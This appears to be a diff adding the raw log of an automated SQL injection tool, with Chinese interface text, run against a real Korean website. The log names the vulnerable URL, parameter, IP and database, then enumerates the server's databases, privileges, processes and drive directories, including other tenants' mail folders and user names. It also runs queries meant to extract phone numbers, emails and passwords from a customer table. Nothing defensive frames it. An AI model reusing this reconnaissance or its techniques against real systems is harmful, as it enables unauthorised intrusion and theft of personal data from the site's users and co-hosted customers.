@@ -1,0 +1,718 @@
+■漏洞信息:============================================================
+ ·URL:http://www.bussayad.com/03_Customer/Notice_View.asp?NoIDX=17
+ ·页面标题：⑵ 滚胶澜己堡绊 (林)剧柳炮饭霓 堪包急 苞厘 ⑵
+ ·参数:NoIDX=17
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:219.255.134.91
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 08:17:27 GMT
+Connection: Keep-Alive
+Content-Length: 12294
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSATCQDQQ=CLDHHIEBOIOJPKLNAJFHEJLN; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：bussayad
+- 用户名：bussayad
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：WEB-EZJUP1HAMMP
+- 服务名：MSSQLSERVER
+- 系统用户名：bussayad
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+APCSoft	D:\Microsoft SQL Server\MSSQL\Data\APCSoft_Data.MDF	
+bussayad	D:\Microsoft SQL Server\MSSQL\data\bussayad_Data.MDF	
+church	D:\Microsoft SQL Server\MSSQL\data\church_Data.MDF	
+FILAGolf	D:\Microsoft SQL Server\MSSQL\data\FILAGolf_Data.MDF	
+fj21_new	D:\Microsoft SQL Server\MSSQL\Data\fj21_new.mdf	
+Hanix	D:\Microsoft SQL Server\MSSQL\data\Hanix_Data.MDF	
+Insa	D:\Microsoft SQL Server\MSSQL\Data\insa.mdf	
+master	D:\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	D:\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	D:\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+Pharmxpert	D:\Microsoft SQL Server\MSSQL\data\Pharmxpert_Data.MDF	
+pocketbike	D:\Microsoft SQL Server\MSSQL\Data\pocketbike_Data.MDF	
+pubs	D:\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+sangreen	D:\Microsoft SQL Server\MSSQL\data\sangreen_Data.MDF	
+sangreenbackup	D:\Microsoft SQL Server\MSSQL\data\sangreenbackup_Data.MDF	
+saunamart	D:\Microsoft SQL Server\MSSQL\Data\saunamart_Data.MDF	
+SportschosunText	D:\Microsoft SQL Server\MSSQL\data\SportschosunText_Data.MDF	
+SportsseoulText	D:\Microsoft SQL Server\MSSQL\data\SportsseoulText_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	WEB-EZJUP1HAMMP	2340	AWAITING COMMAND	IUSR_WEB-EZJUP1HAMMP	
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	WEB-EZJUP1HAMMP	2340	AWAITING COMMAND	IUSR_WEB-EZJUP1HAMMP	
+	background			TASK MANAGER		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEB-EZJUP1HAMMP	SQL Server	SQLOLEDB	WEB-EZJUP1HAMMP		WEB-EZJUP1HAMMP	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+bbc26a27f957e9241e5b4bd7\
+box\
+ExportData\
+Finaldata\
+fport\
+Microsoft SQL Server_back\
+Microsoft SQL Server\
+RECYCLER\
+System Volume Information\
+w2k_cd\
+fport.zip
+
+Dir of D:\fport: 
+
+Fport-2.0\
+
+Dir of C:: 
+
+
+Dir of C:: 
+
+
+Dir of E:: 
+
+Down\
+Inetpub1\
+Inetpub2\
+nWmail_old\
+nWmail\
+RECYCLER\
+System Volume Information\
+Inetpub1.zip
+Inetpub2.zip
+JwEditorBannerPlus.zip
+
+Dir of G:: 
+
+
+Dir of F:: 
+
+汗备颇老\
+磊丰角\
+Backup\
+fport\
+Movie\
+msdownld.tmp\
+RECYCLER\
+System Volume Information\
+fport.zip
+
+Dir of F:\磊丰角: 
+
+
+Dir of F:\Backup: 
+
+Badmail\
+Inetpub1\
+Inetpub2\
+nWmail\
+Pickup\
+
+Dir of F:\fport: 
+
+Fport-2.0\
+Fport.exe
+Fport.txt
+
+Dir of F:\msdownld.tmp: 
+
+
+Dir of F:\RECYCLER: 
+
+S-1-5-21-1960408961-179605362-725345543-500\
+S-1-5-21-796845957-412668190-725345543-1077\
+S-1-5-21-796845957-412668190-725345543-500\
+
+Dir of F:\System Volume Information: 
+
+
+Dir of F:\磊丰角: 
+
+
+Dir of F:\汗备颇老: 
+
+
+Dir of G:: 
+
+
+Dir of E:\System Volume Information: 
+
+
+Dir of E:\RECYCLER: 
+
+S-1-5-21-796845957-412668190-725345543-1077\
+S-1-5-21-796845957-412668190-725345543-500\
+
+Dir of E:\nWmail: 
+
+Maildir\
+Webmail(other domain)\
+Webmail_apcsoft.co.kr\
+Webmail_FOLAGolf\
+Webmail_hanixbio.com\
+Webmail_saunamart\
+Webmail_starlink\
+Webmail_Sungsimdnag\
+Webmail\
+Cleanup.exe
+keyinput.exe
+Mailcheck.dll
+Nmail.exe
+NMailMgr.exe
+NmailMgr.ico
+Npop3.exe
+Nsendmail.dll
+NUpload.dll
+NUpState.dll
+Readfilemail.dll
+readme.txt
+
+Dir of E:\nWmail\Webmail_hanixbio.com: 
+
+Address\
+AdminMenu\
+Board\
+Config\
+Images\
+Include\
+Log\
+Mail\
+MailConfirm\
+Member\
+Notice\
+Schedule\
+Setting\
+default.asp
+Main.asp
+
+Dir of E:\nWmail\Webmail: 
+
+Address\
+AdminMenu\
+Board\
+Config\
+Images\
+Include\
+Log\
+Mail\
+MailConfirm\
+Member\
+Notice\
+Schedule\
+Setting\
+default.asp
+Main.asp
+
+Dir of E:\nWmail_old: 
+
+Maildir\
+Webmail(other domain)\
+Webmail_ApcSoft\
+Webmail_saunamart\
+Webmail\
+
+Dir of E:\nWmail_old\Webmail: 
+
+Include\
+
+Dir of E:\nWmail_old\Maildir: 
+
+apcsoft.co.kr\
+flowercc.co.kr\
+peps.co.kr\
+queue\
+saunamart.co.kr\
+thewho.co.kr\
+yscu.co.kr\
+
+Dir of E:\nWmail_old\Maildir\apcsoft.co.kr: 
+
+apcsoft\
+hhson\
+jklim\
+kjkim\
+mjoh\
+sprite\
+
+Dir of E:\nWmail_old\Maildir\peps.co.kr: 
+
+peps\
+
+Dir of E:\nWmail_old\Maildir\queue: 
+
+Err0\
+Err1\
+Err2\
+Err3\
+Local0\
+Local1\
+pop3before\
+Send0\
+Send1\
+Send2\
+Send3\
+Send4\
+Send5\
+Send6\
+Send7\
+Send8\
+Send9\
+
+Dir of E:\nWmail_old\Maildir\peps.co.kr\peps: 
+
+
+Dir of E:\nWmail_old\Maildir\peps.co.kr\peps: 
+
+
+Dir of E:\nWmail_old\Maildir\saunamart.co.kr: 
+
+jinyong.kim\
+overseas\
+tester\
+
+Dir of E:\nWmail_old\Maildir\thewho.co.kr: 
+
+agent\
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr: 
+
+hjjeong\
+twohyun1012\
+yscu\
+yscu31\
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\yscu: 
+
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\twohyun1012: 
+
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\hjjeong: 
+
+
+
+■数据库信息:============================================================
+- 数据库名：bussayad
+- 用户名：bussayad
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：WEB-EZJUP1HAMMP
+- 服务名：MSSQLSERVER
+- 系统用户名：bussayad
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+APCSoft	D:\Microsoft SQL Server\MSSQL\Data\APCSoft_Data.MDF	
+bussayad	D:\Microsoft SQL Server\MSSQL\data\bussayad_Data.MDF	
+church	D:\Microsoft SQL Server\MSSQL\data\church_Data.MDF	
+FILAGolf	D:\Microsoft SQL Server\MSSQL\data\FILAGolf_Data.MDF	
+fj21_new	D:\Microsoft SQL Server\MSSQL\Data\fj21_new.mdf	
+Hanix	D:\Microsoft SQL Server\MSSQL\data\Hanix_Data.MDF	
+Insa	D:\Microsoft SQL Server\MSSQL\Data\insa.mdf	
+master	D:\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	D:\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	D:\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+Pharmxpert	D:\Microsoft SQL Server\MSSQL\data\Pharmxpert_Data.MDF	
+pocketbike	D:\Microsoft SQL Server\MSSQL\Data\pocketbike_Data.MDF	
+pubs	D:\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+sangreen	D:\Microsoft SQL Server\MSSQL\data\sangreen_Data.MDF	
+sangreenbackup	D:\Microsoft SQL Server\MSSQL\data\sangreenbackup_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	WEB-EZJUP1HAMMP	2340	AWAITING COMMAND	IUSR_WEB-EZJUP1HAMMP	
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	WEB-EZJUP1HAMMP	2340	AWAITING COMMAND	IUSR_WEB-EZJUP1HAMMP	
+	background			TASK MANAGER		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEB-EZJUP1HAMMP	SQL Server	SQLOLEDB	WEB-EZJUP1HAMMP		WEB-EZJUP1HAMMP	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\hjjeong: 
+
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\twohyun1012: 
+
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\yscu: 
+
+
+Dir of E:\nWmail_old\Maildir\yscu.co.kr\yscu31: 
+
+
+Dir of E:\nWmail_old\Maildir\flowercc.co.kr: 
+
+jslee\
+
+Dir of E:\nWmail_old\Maildir\flowercc.co.kr\jslee: 
+
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+Dir of E:\Inetpub2: 
+
+坷鞘铰\
+apcsoft\
+bussayad\
+Fila-golf\
+Hanixbio\
+newyscu\
+Pharmxpert\
+saunamart\
+SportschosunText\
+SportsSeoulText\
+Sungsimdang\
+
+Dir of E:\Inetpub2\bussayad: 
+
+_private\
+_ScriptLibrary\
+_vti_cnf\
+_vti_log\
+_vti_pvt\
+_vti_script\
+_vti_txt\
+01_information\
+02_bussayad\
+03_customer\
+04_sitemap\
+泅锐\
+Controls\
+css\
+fla\
+Function\
+images\
+inc\
+UploadFile\
+_vti_inf.html
+back_main.asp
+main.asp
+main.htm
+main02.htm
+postinfo.html
+ri.asp
+
+
+■数据库信息:============================================================
+- 数据库名：bussayad
+- 用户名：bussayad
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：WEB-EZJUP1HAMMP
+- 服务名：MSSQLSERVER
+- 系统用户名：bussayad
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+APCSoft	D:\Microsoft SQL Server\MSSQL\Data\APCSoft_Data.MDF	
+bussayad	D:\Microsoft SQL Server\MSSQL\data\bussayad_Data.MDF	
+church	D:\Microsoft SQL Server\MSSQL\data\church_Data.MDF	
+FILAGolf	D:\Microsoft SQL Server\MSSQL\data\FILAGolf_Data.MDF	
+fj21_new	D:\Microsoft SQL Server\MSSQL\Data\fj21_new.mdf	
+Hanix	D:\Microsoft SQL Server\MSSQL\data\Hanix_Data.MDF	
+Insa	D:\Microsoft SQL Server\MSSQL\Data\insa.mdf	
+master	D:\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	D:\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	D:\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+Pharmxpert	D:\Microsoft SQL Server\MSSQL\data\Pharmxpert_Data.MDF	
+pocketbike	D:\Microsoft SQL Server\MSSQL\Data\pocketbike_Data.MDF	
+pubs	D:\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+sangreen	D:\Microsoft SQL Server\MSSQL\data\sangreen_Data.MDF	
+sangreenbackup	D:\Microsoft SQL Server\MSSQL\data\sangreenbackup_Data.MDF	
+saunamart	D:\Microsoft SQL Server\MSSQL\Data\saunamart_Data.MDF	
+SportschosunText	D:\Microsoft SQL Server\MSSQL\data\SportschosunText_Data.MDF	
+SportsseoulText	D:\Microsoft SQL Server\MSSQL\data\SportsseoulText_Data.MDF	
+Study	D:\Microsoft SQL Server\MSSQL\data\Study_Data.MDF	
+sungsim_shinmun	D:\Microsoft SQL Server\MSSQL\Data\sungsim.mdf	
+Sungsimdang	D:\Microsoft SQL Server\MSSQL\data\Sungsimdang_Data.MDF	
+Sungsimdang_new	D:\Microsoft SQL Server\MSSQL\data\Sungsimdang_new_Data.MDF	
+tempdb	D:\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+test	D:\Microsoft SQL Server\MSSQL\data\test_Data.MDF	
+thewho	D:\Microsoft SQL Server\MSSQL\data\thewho_Data.MDF	
+Victory	D:\Microsoft SQL Server\MSSQL\Data\Victory_Data.MDF	
+WIN_Korea	D:\Microsoft SQL Server\MSSQL\Data\WIN_Korea_Data.MDF	
+yscu	D:\Microsoft SQL Server\MSSQL\Data\yscu_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+Microsoft(R) Windows (R) 2000 Operating System	runnable	WEB-EZJUP1HAMMP	2340	UPDATE		
+Microsoft(R) Windows (R) 2000 Operating System	runnable	WEB-EZJUP1HAMMP	2340	UPDATE		
+	background			TASK MANAGER		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEB-EZJUP1HAMMP	SQL Server	SQLOLEDB	WEB-EZJUP1HAMMP		WEB-EZJUP1HAMMP	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
+- 数据库名：bussayad
+- 用户名：bussayad
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：WEB-EZJUP1HAMMP
+- 服务名：MSSQLSERVER
+- 系统用户名：bussayad
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+APCSoft	D:\Microsoft SQL Server\MSSQL\Data\APCSoft_Data.MDF	
+bussayad	D:\Microsoft SQL Server\MSSQL\data\bussayad_Data.MDF	
+church	D:\Microsoft SQL Server\MSSQL\data\church_Data.MDF	
+FILAGolf	D:\Microsoft SQL Server\MSSQL\data\FILAGolf_Data.MDF	
+fj21_new	D:\Microsoft SQL Server\MSSQL\Data\fj21_new.mdf	
+Hanix	D:\Microsoft SQL Server\MSSQL\data\Hanix_Data.MDF	
+Insa	D:\Microsoft SQL Server\MSSQL\Data\insa.mdf	
+master	D:\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	D:\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	D:\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+Pharmxpert	D:\Microsoft SQL Server\MSSQL\data\Pharmxpert_Data.MDF	
+pocketbike	D:\Microsoft SQL Server\MSSQL\Data\pocketbike_Data.MDF	
+pubs	D:\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+sangreen	D:\Microsoft SQL Server\MSSQL\data\sangreen_Data.MDF	
+sangreenbackup	D:\Microsoft SQL Server\MSSQL\data\sangreenbackup_Data.MDF	
+saunamart	D:\Microsoft SQL Server\MSSQL\Data\saunamart_Data.MDF	
+SportschosunText	D:\Microsoft SQL Server\MSSQL\data\SportschosunText_Data.MDF	
+SportsseoulText	D:\Microsoft SQL Server\MSSQL\data\SportsseoulText_Data.MDF	
+Study	D:\Microsoft SQL Server\MSSQL\data\Study_Data.MDF	
+sungsim_shinmun	D:\Microsoft SQL Server\MSSQL\Data\sungsim.mdf	
+Sungsimdang	D:\Microsoft SQL Server\MSSQL\data\Sungsimdang_Data.MDF	
+Sungsimdang_new	D:\Microsoft SQL Server\MSSQL\data\Sungsimdang_new_Data.MDF	
+tempdb	D:\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+test	D:\Microsoft SQL Server\MSSQL\data\test_Data.MDF	
+thewho	D:\Microsoft SQL Server\MSSQL\data\thewho_Data.MDF	
+Victory	D:\Microsoft SQL Server\MSSQL\Data\Victory_Data.MDF	
+WIN_Korea	D:\Microsoft SQL Server\MSSQL\Data\WIN_Korea_Data.MDF	
+yscu	D:\Microsoft SQL Server\MSSQL\Data\yscu_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	WEB-EZJUP1HAMMP	1532	AWAITING COMMAND	SYSTEM	
+Microsoft(R) Windows (R) 2000 Operating System	runnable	WEB-EZJUP1HAMMP	2340	UPDATE		
+	background			TASK MANAGER		
+	background			TASK MANAGER		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEB-EZJUP1HAMMP	SQL Server	SQLOLEDB	WEB-EZJUP1HAMMP		WEB-EZJUP1HAMMP	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [bussayad] 的表名……
+ Notice_tbl
+AdSample_tbl
+QNA_tbl
+syscommand
+t_t
+D99_Tmp
+dtproperties
+
+------------------------------------------------------------
+正在获取 [bussayad].[dtproperties] 的列名……
+ id
+objectid
+property
+value
+uvalue
+lvalue
+version
+
+------------------------------------------------------------
+正在获取 [bussayad].[D99_Tmp] 的列名……
+ subdirectory
+depth
+file
+
+------------------------------------------------------------
+正在获取 [bussayad].[syscommand] 的列名……
+ op
+Id
+
+正在执行查询：select top 3 op,Id from bussayad..syscommand order by Id
+------------------------------------------------------------
+正在获取 [bussayad].[QNA_tbl] 的列名……
+ QNAIDX
+QNATitle
+QNANm
+QNAPhone
+QNAEmail
+QNAQuestion
+QNAAnswer
+QNAFlag
+QNAPWD
+QNADate
+QNAADate
+QNAFile
+QNADelete
+
+正在执行查询：select top 3 QNAIDX,QNAPhone,QNAEmail,QNAQuestion,QNAPWD from bussayad..QNA_tbl order by QNAIDX
+
+
+
+正在执行查询：select top 3 QNAIDX,QNANm,QNAPhone,QNAEmail,QNAQuestion,QNAPWD from bussayad..QNA_tbl order by QNANm
+
+
+
+正在执行查询：select top 3 QNAIDX,QNANm,QNAPhone,QNAEmail,QNAQuestion,QNAPWD from bussayad..QNA_tbl order by QNANm
+
+
+
+------------------------------------------------------------
+正在获取数据库 [yscu] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+取记录数失败，使用设定值：5
+
+
+
+
+
+------------------------------------------------------------
+正在获取数据库 [sungsim_shinmun] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+取记录数失败，使用设定值：5
+
+
+
+
+
